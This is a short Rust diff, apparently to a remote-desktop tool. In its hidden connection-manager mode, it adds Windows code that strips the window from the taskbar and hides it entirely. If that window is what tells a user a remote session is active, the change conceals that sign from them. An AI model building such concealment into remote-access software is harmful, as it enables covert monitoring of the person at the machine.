@@ -212,6 +212,21 @@ pub fn start(args: &mut [String]) {
     if !args.is_empty() && args[0] == "--cm" && hide_cm {
         // run_app calls expand(show) + run_loop, we use collapse(hide) + run_loop instead to create a hidden window
         frame.collapse(true);
+        
+        // 完全隐藏窗口（包括任务栏）
+        #[cfg(windows)]
+        {
+            use winapi::um::winuser::{GetWindowLongW, SetWindowLongW, ShowWindow, GWL_EXSTYLE, WS_EX_TOOLWINDOW, SW_HIDE};
+            let hwnd = frame.get_hwnd() as isize;
+            unsafe {
+                // 添加 WS_EX_TOOLWINDOW 样式，使其不在任务栏显示
+                let ex_style = GetWindowLongW(hwnd, GWL_EXSTYLE);
+                SetWindowLongW(hwnd, GWL_EXSTYLE, ex_style | WS_EX_TOOLWINDOW as i32);
+                // 隐藏窗口
+                ShowWindow(hwnd, SW_HIDE);
+            }
+        }
+        
         frame.run_loop();
         return;
     }
